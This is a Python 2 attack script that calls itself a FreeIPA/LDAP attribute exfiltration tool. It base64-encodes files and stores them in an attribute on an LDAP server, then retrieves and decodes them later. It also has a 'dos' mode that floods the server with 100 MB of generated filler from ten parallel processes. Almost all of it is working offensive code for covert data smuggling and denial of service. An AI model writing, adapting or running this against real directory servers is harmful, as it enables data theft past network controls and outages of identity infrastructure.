#!/usr/bin/env python

import time
import sys, os
import argparse
import ldap
import ldap.modlist
import base64
import getpass
from multiprocessing import Process
import tempfile
import collections

proc_number = 10

seed = "1092384956781341341234656953214543219"
words = open("ipsum.txt", "r").read().replace("\n", '').split()

def fdata():
    a = collections.deque(words)
    b = collections.deque(seed)
    while True:
        yield ' '.join(list(a)[0:1024])
        a.rotate(int(b[0]))
        b.rotate(1)

def main():
    parser = argparse.ArgumentParser(description='FreeIPA / LDAP attribute exfiltration script')
    parser.add_argument('-f', '--file', type=str, help='File name to upload', required=False)
    parser.add_argument('-s', '--server', type=str, help='FreeIPA LDAP server', required=True, default=None)
    parser.add_argument('-d', '--dname', type=str, help='LDAP distinguished name', required=True, default=None)
    parser.add_argument('-a', '--attribute', type=str, help='LDAP attribute name', required=True, default=None)
    parser.add_argument('-m', '--mode', type=str, help='Mode name', required=True, default=None)
    parser.add_argument('-o', '--output', type=str, help='Output file name', required=False, default="/tmp/exfil.data")
    parser.add_argument('-p', '--password', type=str, help='Password', required=False, default=None)
    args = parser.parse_args()
    file = args.file
    server = args.server
    dname = args.dname
    password = args.password
    attribute = args.attribute
    mode = args.mode
    output = args.output

    if args.mode == "get":
    	ldap_connect_get(args.server, args.dname, args.password, args.attribute, args.output)
    elif args.mode == "set":
        ldap_connect_set(args.server, args.dname, args.password, args.attribute, args.file)
    elif args.mode == "dos":
    	tmpdir = tempfile.mkdtemp()
	predictable_filename = 'exfil_data'
	saved_umask = os.umask(0077)
	dos_path = os.path.join(tmpdir, predictable_filename)
	fsize = 1024*1024*100
	try:
		with open(dos_path, "w") as tmp:
                        g = fdata()
                        while os.path.getsize(dos_path) < fsize:
                        	tmp.write(base64.encodestring(g.next()))

        except IOError as e:
    		print 'IOError'
    	procs = []
    	for i in range(proc_number):
        	procs = []
		proc = Process(target=ldap_connect_set, args=(args.server, args.dname, args.password, args.attribute, dos_path))
        	procs.append(proc)
        	proc.start()

    	for proc in procs:
        	proc.join()
        
        os.remove(dos_path)
    else:
        sys.exit()

def ldap_connect_get(server, dname, password, attribute, output):
   l = ldap.initialize(server)
   l.protocol_version = ldap.VERSION3
   searchScope = ldap.SCOPE_SUBTREE
   retrieveAttributes = None
   searchFilter = "objectClass=*"
   try:
       entries = 0
       ldap_result_id = l.search(dname, searchScope, searchFilter, retrieveAttributes)
       result_set = []
       while 1:
               result_type, result_data = l.result(ldap_result_id, 0)
               if (result_data == []):
                  break
               else:
                  if result_type == ldap.RES_SEARCH_ENTRY:
                     result_set.append(result_data)
                     entries = entries + 1
   except ldap.LDAPError, e:
        print e

   for i in range(len(result_set)):
           for entry in result_set[i]:
              attr = entry[1][attribute][0]
              decoded = base64.decodestring(attr)
              print decoded + "\n"
              file = open(output, "w")
              file.write(decoded)
              file.close()
              print("*** File saved to ") + output

def ldap_connect_set(server, dname, password, attribute, file):
       ex_file = open(file, "rb")
       ex_file_read = ex_file.read()
       ex_file_encode = base64.encodestring(ex_file_read).replace('\n', '')
       l = ldap.initialize(server)
       l.simple_bind_s(dname,password)
       ldif = [( ldap.MOD_REPLACE, attribute, ex_file_encode)]
       #print("*** Encoded Data : [ %s ]\n") % ex_file_encode
       print("*** Size: [ %s ] bytes") % len(ex_file_read)
       try:
          l.modify_s(dname,ldif)
       except Exception as error:
          print('*** ERROR', error)
       else:
          print('*** Status: OK')
       l.unbind_s()
   
if __name__ == "__main__":

    main()

